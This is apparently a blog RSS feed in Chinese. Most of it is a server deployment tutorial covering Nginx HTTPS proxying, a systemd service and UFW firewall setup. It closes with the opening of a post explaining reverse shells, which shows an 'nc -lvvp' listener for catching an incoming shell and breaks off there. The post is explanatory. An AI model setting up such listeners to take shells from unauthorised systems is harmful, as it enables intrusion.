class=&#34;number&#34;&gt;443&lt;/span&gt; ssl;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;attribute&#34;&gt;server_name&lt;/span&gt; example.com www.example.com;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;attribute&#34;&gt;ssl_certificate&lt;/span&gt; /etc/letsencrypt/live/example.com/fullchain.pem;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;attribute&#34;&gt;ssl_certificate_key&lt;/span&gt; /etc/letsencrypt/live/example.com/privkey.pem;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;attribute&#34;&gt;location&lt;/span&gt; / &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;attribute&#34;&gt;proxy_pass&lt;/span&gt; http://127.0.0.1:8000;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;attribute&#34;&gt;proxy_set_header&lt;/span&gt; Host $host;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;attribute&#34;&gt;proxy_set_header&lt;/span&gt; X-Real-IP $remote_addr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;attribute&#34;&gt;proxy_set_header&lt;/span&gt; X-Forwarded-For $proxy_add_x_forwarded_for;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;attribute&#34;&gt;proxy_set_header&lt;/span&gt; X-Forwarded-Proto $scheme;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;另外，可以将 HTTP 请求重定向到 HTTPS：&lt;/p&gt;
+&lt;figure class=&#34;highlight nginx&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;section&#34;&gt;server&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;attribute&#34;&gt;listen&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;80&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;attribute&#34;&gt;server_name&lt;/span&gt; example.com www.example.com;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;attribute&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;301&lt;/span&gt; https://$host$request_uri;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;修改配置后：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo nginx -t&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo systemctl reload nginx&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;配置网站后台运行&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#配置网站后台运行&#34;&gt;#&lt;/a&gt; 配置网站后台运行&lt;/h3&gt;
+&lt;p&gt;如果直接通过 SSH 执行：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python3 server.py&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;当 SSH 会话断开时，网站进程可能随之退出。&lt;/p&gt;
+&lt;p&gt;因此，正式部署时需要使用进程管理工具，确保网站能够在后台持续运行，并在服务器重启后自动启动。&lt;/p&gt;
+&lt;p&gt;推荐使用 systemd。&lt;/p&gt;
+&lt;p&gt;创建服务配置：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo vim /etc/systemd/system/mywebsite.service&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;写入：&lt;/p&gt;
+&lt;figure class=&#34;highlight ini&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;section&#34;&gt;[Unit]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attr&#34;&gt;Description&lt;/span&gt;=My Python Website&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attr&#34;&gt;After&lt;/span&gt;=network.target&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;section&#34;&gt;[Service]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attr&#34;&gt;User&lt;/span&gt;=website&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attr&#34;&gt;Group&lt;/span&gt;=website&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attr&#34;&gt;WorkingDirectory&lt;/span&gt;=/var/www/mywebsite&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attr&#34;&gt;ExecStart&lt;/span&gt;=/var/www/mywebsite/venv/bin/gunicorn \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    --workers 2 \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    --bind 127.0.0.1:8000 \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    server:app&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attr&#34;&gt;Restart&lt;/span&gt;=always&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attr&#34;&gt;RestartSec&lt;/span&gt;=&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;section&#34;&gt;[Install]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attr&#34;&gt;WantedBy&lt;/span&gt;=multi-user.target&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;注意：这里假设项目使用 Flask，且  &lt;code&gt;server.py&lt;/code&gt;  中的应用对象名为  &lt;code&gt;app&lt;/code&gt; 。如果项目使用 FastAPI，需要改用 Uvicorn 等 ASGI 服务器。&lt;/p&gt;
+&lt;p&gt;设置目录权限：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo chown -R website:website /var/www/mywebsite&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;启动服务：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo systemctl daemon-reload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo systemctl start mywebsite&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo systemctl &lt;span class=&#34;built_in&#34;&gt;enable&lt;/span&gt; mywebsite&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;查看服务状态：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo systemctl status mywebsite&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;查看运行日志：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo journalctl -u mywebsite -f&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;常用服务管理命令：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 启动&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo systemctl start mywebsite&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 停止&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo systemctl stop mywebsite&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 重启&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo systemctl restart mywebsite&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 查看状态&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo systemctl status mywebsite&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 开机自启动&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo systemctl &lt;span class=&#34;built_in&#34;&gt;enable&lt;/span&gt; mywebsite&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;服务器安全配置&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#服务器安全配置&#34;&gt;#&lt;/a&gt; 服务器安全配置&lt;/h2&gt;
+&lt;p&gt;网站能够正常访问后，还需要检查服务器的安全配置。&lt;/p&gt;
+&lt;h3 id=&#34;配置防火墙&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#配置防火墙&#34;&gt;#&lt;/a&gt; 配置防火墙&lt;/h3&gt;
+&lt;p&gt;如果使用 UFW，可以执行：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo apt install ufw -y&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;开放 SSH、HTTP 和 HTTPS 端口：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo ufw allow 22/tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo ufw allow 80/tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo ufw allow 443/tcp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;启用防火墙：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo ufw &lt;span class=&#34;built_in&#34;&gt;enable&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;查看防火墙状态：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo ufw status&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;注意：如果 SSH 使用的不是 22 端口，需要先放行实际 SSH 端口，避免启用防火墙后无法登录服务器。&lt;/p&gt;
+&lt;p&gt;此外，云服务商的安全组也需要开放对应端口。&lt;/p&gt;
+&lt;p&gt;通常公网只需要开放：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;端口&lt;/th&gt;
+&lt;th&gt;用途&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;22&lt;/td&gt;
+&lt;td&gt;SSH 远程管理&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;80&lt;/td&gt;
+&lt;td&gt;HTTP&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;443&lt;/td&gt;
+&lt;td&gt;HTTPS&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Python 网站的 8000 端口只监听  &lt;code&gt;127.0.0.1&lt;/code&gt; ，不需要对公网开放。&lt;/p&gt;
+&lt;h3 id=&#34;检查-nginx-和网站进程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#检查-nginx-和网站进程&#34;&gt;#&lt;/a&gt; 检查 Nginx 和网站进程&lt;/h3&gt;
+&lt;p&gt;查看 Nginx：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo systemctl status nginx&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;查看网站服务：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo systemctl status mywebsite&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;查看端口监听：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo ss -lntp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;部署完成与验证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#部署完成与验证&#34;&gt;#&lt;/a&gt; 部署完成与验证&lt;/h2&gt;
+&lt;p&gt;完成以上步骤后，可以通过浏览器访问：&lt;/p&gt;
+&lt;figure class=&#34;highlight text&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;https://example.com&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://www.example.com&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;也可以使用 curl 验证：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;curl -I https://example.com&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;如果返回：&lt;/p&gt;
+&lt;figure class=&#34;highlight text&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;HTTP/2 200&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;说明网站能够正常响应 HTTPS 请求。&lt;/p&gt;
+&lt;p&gt;还可以检查 SSL 证书：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;openssl s_client \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    -connect example.com:443 \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    -servername example.com&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://snowroll.github.io/reverse-shell/</guid>
+            <title>反向shell</title>
+            <link>https://snowroll.github.io/reverse-shell/</link>
+            <category>linux</category>
+            <category>reverse-shell</category>
+            <pubDate>Sat, 13 Aug 2022 07:05:11 +0000</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;什么是反向shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#什么是反向shell&#34;&gt;#&lt;/a&gt; 什么是反向 shell&lt;/h1&gt;
+&lt;p&gt;我们在客户端 A 通过 &lt;code&gt;ssh&lt;/code&gt;  命令连接服务器 B，从而得到服务器 B 的终端命令行，客户端主动发起的这次连接过程我们称为正向 shell&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ssh test@10.10.10.1 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;顾名思义，反向 shell 应该由服务器端 B 主动发起，而客户端 A 被动监听，接收这次连接。&lt;/p&gt;
+&lt;p&gt;客户端 A （假设 ip 为 1.2.3.4）&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;bash&#34;&gt; 打开一个端口，监听连接请求&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 2333&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
